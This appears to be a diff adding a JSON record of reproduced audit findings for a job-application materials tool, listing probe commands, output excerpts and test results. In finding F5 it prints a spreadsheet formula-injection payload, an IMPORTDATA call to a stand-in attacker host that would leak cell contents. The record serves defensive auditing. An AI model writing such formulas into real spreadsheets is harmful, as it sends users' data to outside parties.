@@ -1,0 +1,314 @@
+{
+ "could_not_run": [],
+ "lane": "F",
+ "sha": "f227fbb",
+ "summary": "Reproduced 15/15 finding rows (F1-F11, F13, F15, F18, F20) and 19/19 floor test files (146 root + 17 worker tests, all passing): 34 REPRODUCED, 0 NOT-REPRODUCED, 0 UNCLEAR, 0 could_not_run. The e2e S1-S6 output, P1-P4 bundle, and rescore-overlap output match the report's \u00a74 verbatim except timing-dependent read counts. Our reruns left the tree as found (only pre-existing logos.json modification, same +2/-25 stat; sandbox tpl received the new write).",
+ "verdicts": [
+  {
+   "command": "bash .lane-evidence/probes/F-materials-e2e.sh",
+   "id": "F1",
+   "note": "Pat Probe profile yielded the tracked master: server/materials-drafter.mjs:30-45 readMasterResume + :400-406 template use. E2E S1 shows owner h1 and 0 Pat occurrences, matching report \u00a74 S1. Full output also showed an owner-email count line, redacted here to presence-only.",
+   "output_excerpt": "=== S1 good stub: whose resume does a non-Emilio user get? (F1) ===\n   1 <h1 class=\"name\">Emilio Nunez-Garcia</h1>\n   8 Audacy\nPat Probe occurrences in resume.html: 0\n-- qa-report.md\nStatus: REVIEW",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node .lane-evidence/probes/F-profile-critic.mjs",
+   "id": "F2",
+   "note": "P1 on the real templates with a clean writer letter still flags banned_filler: server/materials-critic.mjs:203 regex over composed HTML vs cover-letter.html:34 guidance comment. E2E S1 qa-report corroborates Status REVIEW with `banned_filler (review)`.",
+   "output_excerpt": "== P1 critic on templates with a clean writer letter (F2) ==\nstatus: fail | issues: resume_page_count_high:fail, banned_filler:review\nbanned phrase source: template line 34 (an HTML comment)",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "bash .lane-evidence/probes/F-materials-e2e.sh",
+   "id": "F3",
+   "note": "S1 stub log shows 3 calls (1 writer + 2 editor loops), ~47-49k userChars (~11.9-12.4k tok), max_tokens 4096: server/materials-writer.mjs:196-206 prompt carries raw master HTML; server/materials-drafter.mjs:746-799 editor loop.",
+   "output_excerpt": "{\"n\":1,\"mode\":\"good\",\"max_tokens\":4096,\"userChars\":47145,\"approxInputTokens\":11914,\"userHasEmilio\":true,\"userHasProbeCandidate\":false,\"isEditor\":false}\n{\"n\":2,\"mode\":\"good\",\"max_tokens\":4096,\"userChars\":48955,\"approxInputTokens\":12366,\"userHasEmilio\":true,\"userHasProbeCandidate\":false,\"isEditor\":true}\n{\"n\":3,\"mode\":\"good\",\"max_tokens\":4096,\"userChars\":48955,\"approxInputTokens\":12366,\"userHasEmilio\":true,\"userHasProbeCandidate\":false,\"isEditor\":true}",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node .lane-evidence/probes/F-rescore-overlap.mjs",
+   "id": "F4",
+   "note": "No single-flight in server/index.mjs:542-661; server/profile-rescore-worker.mjs:1324-1515 runs overlap. Slow old-profile run overwrote new scores (2,2,2 where 9 expected) with doubled spend (6 calls, 6 writes).",
+   "output_excerpt": "run A result {\"rescored\":3,\"skipped\":0,\"failed\":0,\"total\":3}\nrun B result {\"rescored\":3,\"skipped\":0,\"failed\":0,\"total\":3}\nLLM calls: 6 Sheet batchUpdate writes: 6 valueInputOption: USER_ENTERED\nFinal Fit Score cells (H2..H4): 2, 2, 2 <- profile B (newest) expected 9",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node .lane-evidence/probes/F-rescore-overlap.mjs",
+   "id": "F5",
+   "note": "Rescore Sheet writer uses USER_ENTERED at server/profile-rescore-worker.mjs:597-640 for LLM leadAngle text (:1261-1263). Probe shows injected =IMPORTDATA formula sent with USER_ENTERED.",
+   "output_excerpt": "LLM calls: 6 Sheet batchUpdate writes: 6 valueInputOption: USER_ENTERED\nFinal Talking Points Q2: old angle\nTalking Points values sent with USER_ENTERED, in write order: [\"=IMPORTDATA(\\\"https://attacker.invalid/?q=\\\"&A1)\",\"=IMPORTDATA(\\\"https://attacker.invalid/?q=\\\"&A1)\",\"=IMPORTDATA(\\\"https://attacker.invalid/?q=\\\"&A1)\",\"old angle\",\"old angle\",\"old angle\"]",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node .lane-evidence/probes/F-profile-critic.mjs",
+   "id": "F6",
+   "note": "server/user-profile.mjs:178-200 renames live to backup before tmp write, so concurrent readers see no_profile; backups never pruned. Counts vary by timing (1134/411 here vs 727/363 in report) but the window and 40 backups after 41 saves reproduce.",
+   "output_excerpt": "== P4 profile write window + unbounded backups (F6) ==\nconcurrent reads=1134, reads that saw no_profile during saves=411\nbackup files after 41 saves: 40",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node -e 'import(\"./server/brand-logos.mjs\").then(m=>console.log(m.getBrandLogosTemplateRoot()))' && git ls-files --error-unmatch integrations/hermes-job-hunt/resume-template/logos.json",
+   "id": "F7",
+   "note": "Default template root is the tracked repo dir (server/brand-logos.mjs:51-53,84-87 fallback; writer :398-402 via server/index.mjs:351) and logos.json is tracked. Tree still shows the pre-existing +2/-25 dirty file; our pinned e2e rerun wrote only to sandbox tpl, leaving the tracked hash unchanged.",
+   "output_excerpt": "/Users/emilionunezgarcia/Job-Bored.worktrees/beaudit-F/integrations/hermes-job-hunt/resume-template\nintegrations/hermes-job-hunt/resume-template/logos.json",
+   "sev": "P1",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "bash .lane-evidence/probes/F-materials-e2e.sh",
+   "id": "F8",
+   "note": "S6 repair payload notes reach the writer as voice samples: server/index.mjs:711-731 to server/materials-drafter.mjs:137-152 to server/materials-writer.mjs:201-203. Stub log shows Voice samples head with the repair goal on all 3 regeneration calls.",
+   "output_excerpt": "{\"ok\":true,\"slug\":\"s1-good\",\"repair\":{\"feature\":\"resume\",\"strategy\":\"collapse\",\"issueCodes\":[\"resume_page_count_high\"]}}\n{\"n\":9,\"isEditor\":false,\"userHasVoiceSamples\":true,\"voiceSamplesHead\":\"Voice samples:\\n[\\\"Goal: Repair the tailored resume so it intentionally fits the page target.}\n{\"n\":10,\"isEditor\":true,\"userHasVoiceSamples\":true}\n{\"n\":11,\"isEditor\":true,\"userHasVoiceSamples\":true}",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "bash .lane-evidence/probes/F-materials-e2e.sh",
+   "id": "F9",
+   "note": "server/materials-request.mjs:80-82 drops jobDescription/jdText, so S5 body JD is ignored and the drafter hits jd_unusable with 0 LLM calls; server/materials-drafter.mjs:664-679,888-898 request-JD branches never run.",
+   "output_excerpt": "=== S5 jobDescription in request body is dropped by normalizeRequestBody (F9) ===\nCached job description is unusable and scraping the job URL failed. Paste the full job posting into the Dossier (not a fit blurb), or replace the aggregator/blocked URL with the employer careers page.\npending.json\nqa-report.md\nstub calls for S5: 0",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node .lane-evidence/probes/F-profile-critic.mjs",
+   "id": "F10",
+   "note": "Schema additionalProperties false rejects writingSamples, so server/materials-drafter.mjs:141-147 profile voice branch is dead. P3 validateProfile output matches report exactly.",
+   "output_excerpt": "== P3 writingSamples cannot be saved, so the drafter's profile voice branch is dead (F10) ==\nvalidateProfile(+writingSamples).ok = false | must NOT have additional properties {\"additionalProperty\":\"writingSamples\"}",
+   "sev": "P3",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "node .lane-evidence/probes/F-profile-critic.mjs",
+   "id": "F11",
+   "note": "server/profile-from-resume.mjs:220-229,234-236 worker-config shadows fresh resume.txt. P2 heading still says F5 (earlier label per report \u00a74); the staged NEW write followed by worker_config OLD read reproduces the shadowing claim.",
+   "output_excerpt": "== P2 resume source shadowing (F5) ==\nfrom-resume with body -> staged_request | cached to $HOME/.jobbored/resume.txt\nnext stored-resume reader -> worker_config \"OLD resume from worker-config\"",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "bash .lane-evidence/probes/F-materials-e2e.sh",
+   "id": "F13",
+   "note": "S2/S3/S4 surface raw internals with no code/nextStep/retryable: server/materials-drafter.mjs:610-619 progress message; server/materials-writer.mjs:337-342,501-513 parse retry. Call counts 2/2/1 match report.",
+   "output_excerpt": "{\"phase\":\"failed\",\"message\":\"WriterJsonError: no JSON object found\",\"attempt\":1}\nWriterJsonError: unterminated JSON object\nLocal HTTP 500\nstub calls for S2: 2\nstub calls for S3: 2\nstub calls for S4: 1",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "echo \"---drafter pin loader---\"; sed -n '469,473p' server/materials-drafter.mjs; echo \"---rescore env resolver---\"; sed -n '739,748p' server/profile-rescore-worker.mjs; echo \"---from-resume precedence---\"; sed -n '386,400p' server/profile-from-resume.mjs; echo \"---writer client head---\"; sed -n '349,356p' server/materials-writer.mjs",
+   "id": "F15",
+   "note": "No executable reproducer in report; verified by cited reads. Drafter loads llm.json only, rescore resolves via JOBBORED_LLM_CONFIG_PATH+env, from-resume honors PROFILE_PROVIDER precedence; separate HTTP clients exist in materials-writer, profile-from-resume, and rescore.",
+   "output_excerpt": "---drafter pin loader---\n  const loadPin = typeof deps.loadPin === \"function\" ? deps.loadPin : () => loadLlmConfig();\n---rescore env resolver---\nexport function getProfileRescoreProviderConfigFromEnv(env = process.env) {\n  const pathOverride = String(\n    env.JOBBORED_LLM_CONFIG_PATH || process.env.JOBBORED_LLM_CONFIG_PATH || \"\",\n---from-resume precedence---\nexport function getProfileProviderConfig() {\n  const explicitProfileProvider = readFirstEnv([\"PROFILE_PROVIDER\", \"PROFILE_LLM_PROVIDER\"], \"\");\n---writer client head---\nasync function generateGemini(input, extraUserText) {",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED (read)",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "echo \"resume.html owner-name lines:\"; grep -n -c 'Emilio Nunez-Garcia' integrations/hermes-job-hunt/resume-template/resume.html; echo \"resume.html gmail-marker lines:\"; grep -n -c '@gmail.com' integrations/hermes-job-hunt/resume-template/resume.html; echo \"resume.html linkedin-marker lines:\"; grep -n -c 'linkedin.com/in' integrations/hermes-job-hunt/resume-template/resume.html; echo \"cover-letter owner mentions:\"; grep -c -E 'Emilio|Audacy' integrations/hermes-job-hunt/cover-letter-template/cover-letter.html; echo \"tracked?:\"; git ls-files --error-unmatch integrations/hermes-job-hunt/resume-template/resume.html integrations/hermes-job-hunt/cover-letter-template/cover-letter.html",
+   "id": "F18",
+   "note": "No executable reproducer; verified by redacted counts (no secret values printed). Tracked resume.html:6,10,791,798 and cover-letter.html contain owner markers and both files are git-tracked, matching the report.",
+   "output_excerpt": "resume.html owner-name lines:\n6\nresume.html gmail-marker lines:\n1\nresume.html linkedin-marker lines:\n1\ncover-letter owner mentions:\n7\ntracked?:\nintegrations/hermes-job-hunt/cover-letter-template/cover-letter.html\nintegrations/hermes-job-hunt/resume-template/resume.html",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED (read)",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "echo \"baseDeps users (inject readMasterResume):\"; grep -c 'baseDeps(dir' tests/materials-drafter.test.mjs; echo \"direct readMasterResume lines:\"; grep -c 'readMasterResume' tests/materials-drafter.test.mjs; echo \"critic banned_filler assertion:\"; grep -n 'banned_filler' tests/materials-critic.test.mjs",
+   "id": "F20",
+   "note": "No executable reproducer; verified by test reads. 9 baseDeps call sites inject readMasterResume (10 grep hits include the helper definition) plus 3 direct injections; critic test only asserts banned_filler fires at line 32, with no clean-letter-on-real-template pass case.",
+   "output_excerpt": "baseDeps users (inject readMasterResume):\n10\ndirect readMasterResume lines:\n4\ncritic banned_filler assertion:\n32:    assert.equal(out.issues.some((i) => i.code === \"banned_filler\"), true);",
+   "sev": "P2",
+   "status_in_report": "CONFIRMED (read)",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/application-materials-root.test.mjs",
+   "id": "TEST:tests/application-materials-root.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 5\n\u2139 suites 2\n\u2139 pass 5\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/application-materials.test.mjs",
+   "id": "TEST:tests/application-materials.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 55\n\u2139 suites 12\n\u2139 pass 55\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/brand-logos-endpoint.test.mjs",
+   "id": "TEST:tests/brand-logos-endpoint.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 9\n\u2139 suites 0\n\u2139 pass 9\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-composer.test.mjs",
+   "id": "TEST:tests/materials-composer.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 2\n\u2139 suites 2\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-critic.test.mjs",
+   "id": "TEST:tests/materials-critic.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 3\n\u2139 suites 1\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-drafter.test.mjs",
+   "id": "TEST:tests/materials-drafter.test.mjs",
+   "note": "Floor file from \u00a74; all pass (13 tests).",
+   "output_excerpt": "\u2139 tests 13\n\u2139 suites 1\n\u2139 pass 13\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-jd-gate.test.mjs",
+   "id": "TEST:tests/materials-jd-gate.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 5\n\u2139 suites 2\n\u2139 pass 5\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-pdf.test.mjs",
+   "id": "TEST:tests/materials-pdf.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 4\n\u2139 suites 1\n\u2139 pass 4\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-repair.test.mjs",
+   "id": "TEST:tests/materials-repair.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 5\n\u2139 suites 1\n\u2139 pass 5\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-request-endpoint.test.mjs",
+   "id": "TEST:tests/materials-request-endpoint.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 8\n\u2139 suites 2\n\u2139 pass 8\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-request-no-hermes.test.mjs",
+   "id": "TEST:tests/materials-request-no-hermes.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 1\n\u2139 suites 1\n\u2139 pass 1\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/materials-writer.test.mjs",
+   "id": "TEST:tests/materials-writer.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 9\n\u2139 suites 3\n\u2139 pass 9\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/oneflow-l1-server-resume.test.mjs",
+   "id": "TEST:tests/oneflow-l1-server-resume.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 7\n\u2139 suites 2\n\u2139 pass 7\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/profile-draft-truncation.test.mjs",
+   "id": "TEST:tests/profile-draft-truncation.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 3\n\u2139 suites 1\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/profile-from-resume-staged.test.mjs",
+   "id": "TEST:tests/profile-from-resume-staged.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 3\n\u2139 suites 1\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/profile-provider-pin-precedence.test.mjs",
+   "id": "TEST:tests/profile-provider-pin-precedence.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 3\n\u2139 suites 1\n\u2139 pass 3\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/profile-rescore-provider.test.mjs",
+   "id": "TEST:tests/profile-rescore-provider.test.mjs",
+   "note": "Floor file from \u00a74; all pass.",
+   "output_excerpt": "\u2139 tests 9\n\u2139 suites 4\n\u2139 pass 9\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" npm test -- tests/integration/profile-from-resume-unconfigured-provider.test.mjs",
+   "id": "TEST:tests/integration/profile-from-resume-unconfigured-provider.test.mjs",
+   "note": "Floor file from \u00a74; all pass. Per-file sum is 146 root tests, matching the report floor.",
+   "output_excerpt": "\u2139 tests 2\n\u2139 suites 1\n\u2139 pass 2\n\u2139 fail 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  },
+  {
+   "command": "HOME=\"$PWD/.lane-evidence/home\" node --experimental-strip-types --test integrations/browser-use-discovery/tests/profile-aware-scorer-prefilter.test.ts",
+   "id": "TEST:integrations/browser-use-discovery/tests/profile-aware-scorer-prefilter.test.ts",
+   "note": "Worker floor test from \u00a74; 17/17 pass, matching the report.",
+   "output_excerpt": "\u2139 tests 17\n\u2139 suites 2\n\u2139 pass 17\n\u2139 fail 0\n\u2139 cancelled 0\n\u2139 skipped 0",
+   "sev": "N/A",
+   "status_in_report": "FLOOR",
+   "verdict": "REPRODUCED"
+  }
+ ]
+}
